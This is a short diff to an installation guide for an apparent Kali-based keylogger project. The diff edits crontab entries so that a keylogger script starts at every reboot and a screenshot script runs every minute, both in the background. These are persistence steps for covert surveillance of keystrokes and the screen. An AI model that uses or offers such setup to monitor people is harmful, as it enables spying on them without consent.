@@ -15,9 +15,9 @@ Installation Guide
 	'crontab -e'
 	choose vim
 	Edit crontab
-		'@reboot /home/kali/python/keylogger_project/keylogger_project.py'
+		'@reboot /home/kali/python/keylogger_project/keylogger_project.py &'
 6. Make a crontab entry to run screenlogger every minute
 	'crontab -e'
 	choose vim
 	Edit crontab
-		'* * * * * /home/kali/python/keylogger_project/screenshot.py'
+		'* * * * * /home/kali/python/keylogger_project/screenshot.py &'
